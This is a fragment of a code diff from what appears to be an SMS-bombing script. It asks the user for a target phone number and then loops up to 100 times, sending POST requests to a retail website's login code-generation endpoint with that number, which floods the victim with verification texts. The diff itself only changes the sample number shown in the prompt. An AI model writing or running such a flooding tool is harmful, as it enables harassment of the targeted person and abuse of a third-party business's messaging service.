@@ -19,7 +19,7 @@ for info in list(full_desc):
     
 print("\n[*] Ctrl + C  # to exit ")
 
-phone = input("\n[-] Phone Target (Sample 0611233455): ")
+phone = input("\n[-] Phone Target (Sample 0600000000): ")
 n = 0
 while n<100:
     requests.post("https://shop.foodland.co.th/login/generation", data={"phone": phone})
